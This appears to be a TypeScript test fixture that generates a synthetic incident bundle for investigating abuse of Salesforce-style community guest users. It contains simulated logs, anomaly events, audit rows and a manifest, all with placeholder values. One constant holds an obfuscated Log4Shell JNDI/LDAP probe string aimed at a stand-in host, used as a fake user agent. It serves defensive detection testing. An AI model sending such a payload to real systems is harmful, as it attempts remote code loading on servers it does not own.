/**
 * Synthetic incident bundle. Every id, IP and name here is a fixture value that passes
 * .githooks/pre-commit: ids carry 'xx', IPs are private or RFC 5737, emails are example.com.
 * It reproduces the shape of a real investigation without any of its data.
 */
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { csvLine } from '../../../src/incident/csv.js';
import { BUNDLE_PATHS, logPath, sha256File, writeJsonAtomic } from '../../../src/incident/bundleIo.js';
import type { AnomalyEvent, AuditRow, BundleManifest, FollowUp, GuestUser, LogCoverage, LogType, LoginDayCount, Wave } from '../../../src/incident/model.js';

export const GUEST_A = '005xx000000gstA';
export const GUEST_B = '005xx000000gstB';
export const SITE_A = 'Site A';
export const SITE_B = 'Site B';
export const PROBE_IP = '198.51.100.143';
export const ACTOR_IPS = Array.from({ length: 8 }, (_, i) => `203.0.113.${100 + i}`);
export const D1 = '2026-06-30';
export const D2 = '2026-09-15';
export const LINKED_USER = '005xx000000tstU';
export const BASELINE_DAYS = ['2026-06-29', '2026-07-01', '2026-09-14', '2026-09-16'];
const DAYS = ['2026-06-29', D1, '2026-07-01', '2026-09-14', D2, '2026-09-16'];
// A Log4Shell probe string, deliberately not a template literal.
// oxlint-disable-next-line no-template-curly-in-string
const LOG4SHELL_UA = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.example.com/a}';

const AURA_HEADER = ['TIMESTAMP_DERIVED', 'USER_ID', 'CLIENT_IP', 'USER_AGENT', 'URI', 'REQUEST_ID', 'ACTION_MESSAGE'];
const SITES_HEADER = ['TIMESTAMP_DERIVED', 'USER_ID', 'CLIENT_IP', 'REQUEST_ID', 'RESPONSE_SIZE', 'URI'];

const ACT = {
  getItems: '1$serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems=12',
  richText: '1$serviceComponent://ui.communities.components.aura.components.forceCommunity.richText.RichTextController/ACTION$getParsedRichTextValue=0',
  nav: '2$serviceComponent://ui.communities.components.aura.components.forceCommunity.navigationMenu.NavigationMenuDataProviderController/ACTION$getNavigationMenu=3',
  login: '1$apex://SiteLoginFormController/ACTION$login=7',
};

interface Req { ts: string; user: string; ip: string; ua: string; action: string; size: number }

function stamp(day: string, hour: number, i: number): string {
  return `${day}T${String(hour).padStart(2, '0')}:${String(i % 60).padStart(2, '0')}:${String((i * 7) % 60).padStart(2, '0')}.000Z`;
}

function visitorTraffic(day: string, user: string): Req[] {
  const out: Req[] = [];
  for (let v = 0; v < 20; v++) {
    const ip = `10.${v + 1}.0.1`;
    for (let i = 0; i < 20; i++) out.push({ ts: stamp(day, (v + i) % 24, i), user, ip, ua: 'Mozilla/5.0 (Windows NT 10.0)', action: i % 2 ? ACT.richText : ACT.nav, size: 900 });
    for (let i = 0; i < 30; i++) out.push({ ts: stamp(day, (v + i) % 24, i + 20), user, ip, ua: 'Mozilla/5.0 (Windows NT 10.0)', action: '', size: 5000 });
  }
  return out;
}

function probeTraffic(day: string, user: string, calls: number, getItems: number): Req[] {
  return Array.from({ length: calls }, (_, i) => ({
    ts: stamp(day, 22 + (i % 2), i), user, ip: PROBE_IP, ua: 'Mozilla/5.0 (Windows NT 10.0; rv:152.0) Gecko/20100101 Firefox/152.0',
    action: i < getItems ? ACT.getItems : ACT.richText, size: i < getItems ? 1846 : 900,
  }));
}

function actorTraffic(): Req[] {
  const out: Req[] = [];
  const bigSizes = [9385, 8488, 4442, 2701, 2185, 2185, 2185];
  let getItems = 0;
  let n = 0;
  for (const ip of ACTOR_IPS) {
    for (let i = 0; i < 600; i++, n++) {
      const hour = 4 + (i % 8);
      let action = ACT.richText;
      let size = 1856;
      if (getItems < 198 && n % 24 === 0) { action = ACT.getItems; size = getItems < 7 ? bigSizes[getItems] : 1846; getItems++; }
      else if (n % 120 === 5) { action = ACT.login; size = 1861; }
      const ua = n < 3 ? LOG4SHELL_UA : '';
      out.push({ ts: stamp(D2, hour, i), user: GUEST_A, ip, ua, action, size });
    }
  }
  if (getItems !== 198) throw new Error(`fixture produced ${getItems} getItems, expected 198`);
  return out;
}

export async function generateScenario(dir = fs.mkdtempSync(path.join(os.tmpdir(), 'incident-scenario-'))): Promise<string> {
  const files: Record<string, string> = {};
  const logs: LogCoverage[] = [];
  const put = async (rel: string, body: string) => {
    const p = path.join(dir, rel);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, body);
    files[rel] = await sha256File(p);
  };

  for (const day of DAYS) {
    const reqs: Req[] = [...visitorTraffic(day, GUEST_A), ...visitorTraffic(day, GUEST_B)];
    if (day === D1) reqs.push(...probeTraffic(D1, GUEST_A, 300, 20), ...probeTraffic(D1, GUEST_B, 100, 0));
    if (day === D2) reqs.push(...actorTraffic());
    let aura = csvLine(AURA_HEADER);
    let sites = csvLine(SITES_HEADER);
    reqs.forEach((r, i) => {
      const rid = `R${day.replace(/-/g, '')}${String(i).padStart(7, '0')}`;
      aura += csvLine([r.ts, r.user, r.ip, r.ua, r.action ? '/sfsites/aura' : '/s/', rid, r.action]);
      sites += csvLine([r.ts, r.user, r.ip, rid, String(r.size), '/sfsites/aura']);
      if (i % 10 === 0) sites += csvLine([r.ts, r.user, r.ip, rid, '0', '/sfsites/aura']); // duplicate request id
    });
    for (let k = 0; k < 5; k++) sites += csvLine([stamp(day, 5, k), GUEST_A, ACTOR_IPS[0], '', '99999', '/sfsites/aura']);
    for (const [type, body] of [['AuraRequest', aura], ['Sites', sites]] as Array<[LogType, string]>) {
      const rel = logPath(type, day);
      await put(rel, body);
      const rows = body.split('\n').length - 2;
      logs.push({ type, day, status: 'collected', totalRows: rows, guestRows: rows, guestRowsByUser: {}, malformed: 0, file: rel });
    }
  }

  const anomalies: AnomalyEvent[] = [
    { eventIdentifier: 'evt-w1', eventDate: `${D1}T22:47:02Z`, score: 1, userId15: GUEST_A, username: 'site_a@example.com', sourceIp: PROBE_IP, totalControllerEvents: 5470 },
    { eventIdentifier: 'evt-w2', eventDate: `${D1}T23:10:00Z`, score: 1, userId15: GUEST_B, username: 'site_b@example.com', sourceIp: PROBE_IP, totalControllerEvents: 775 },
    { eventIdentifier: 'evt-w3', eventDate: `${D2}T04:04:34Z`, score: 1, userId15: GUEST_A, username: 'site_a@example.com', totalControllerEvents: 7266 },
  ];
  const audit: AuditRow[] = [
    ...Array.from({ length: 10 }, (_, i) => ({ createdDate: `2026-08-0${(i % 9) + 1}T07:00:00Z`, createdBy: 'Admin One', section: 'Manage Users', action: 'profileChanged', display: `Changed profile Site B Guest Profile: tab ${i} was changed from Default On to Tab Hidden` })),
    { createdDate: '2026-07-05T23:15:00Z', createdBy: 'Admin Two', section: 'Manage Users', action: 'profileChanged', display: 'Changed profile Site A Guest Profile: general user permission Access Activities was changed from enabled to disabled' },
    { createdDate: '2026-07-05T23:49:41Z', createdBy: 'Site A Guest User', section: 'Customer Portal', action: 'createdcustomeruser', display: 'Created new Customer User Test Tester' },
    ...['00:10', '02:00', '22:00'].map((t, i) => ({ createdDate: `${D2}T${t}:00Z`, createdBy: 'Site A Guest User', section: 'Customer Portal', action: 'createdcustomeruser', display: `Created new Customer User Visitor ${i}` })),
  ];
  const loginsByDay: LoginDayCount[] = DAYS.flatMap((day) => [{ day, status: 'Success', count: 1400 }, { day, status: 'Invalid Password', count: 170 }]);
  const followUp: FollowUp = {
    logins: [{ loginTime: '2026-07-05T23:58:33Z', userId15: LINKED_USER, sourceIp: PROBE_IP, status: 'Success', loginUrl: 'https://example.com/s/login', browser: 'Firefox 152' }],
    users: [{ id15: LINKED_USER, name: 'Test Tester', email: 'test.tester@example.com', createdDate: '2026-07-05T23:49:41Z', createdById15: GUEST_A, profileName: 'Site A Member', isActive: true }],
  };
  await put(BUNDLE_PATHS.anomalies, JSON.stringify(anomalies));
  await put(BUNDLE_PATHS.audit, JSON.stringify(audit));
  await put(BUNDLE_PATHS.loginsByDay, JSON.stringify(loginsByDay));
  await put(BUNDLE_PATHS.followUp, JSON.stringify(followUp));

  const guests: GuestUser[] = [
    { id15: GUEST_A, username: 'site_a@example.com', name: 'Site A Guest User', profileName: 'Site A Guest Profile', permissionSetLabels: [], siteNames: [SITE_A], active: true },
    { id15: GUEST_B, username: 'site_b@example.com', name: 'Site B Guest User', profileName: 'Site B Guest Profile', permissionSetLabels: ['Site B Files'], siteNames: [SITE_B], active: true },
  ];
  const waves: Wave[] = [
    { id: 'W1', guestId15: GUEST_A, site: SITE_A, days: [D1], eventIds: ['evt-w1'] },
    { id: 'W2', guestId15: GUEST_B, site: SITE_B, days: [D1], eventIds: ['evt-w2'] },
    { id: 'W3', guestId15: GUEST_A, site: SITE_A, days: [D2], eventIds: ['evt-w3'] },
  ];
  const manifest: BundleManifest = {
    version: 1, complete: true, orgId: '00Dxx0000000000EAA', orgName: 'Fixture Org', collectedAt: '2026-10-05T00:00:00Z', sinceDays: 120,
    detectorAvailable: true, waves, guests, logs,
    audit: { from: '2026-06-23', to: '2026-10-05', truncatedWindows: [], inaccessible: false },
    limits: { queryAllFiles: false, viewAllData: true }, ipRangeFiles: [], files,
  };
  writeJsonAtomic(path.join(dir, BUNDLE_PATHS.manifest), manifest);
  return dir;
}
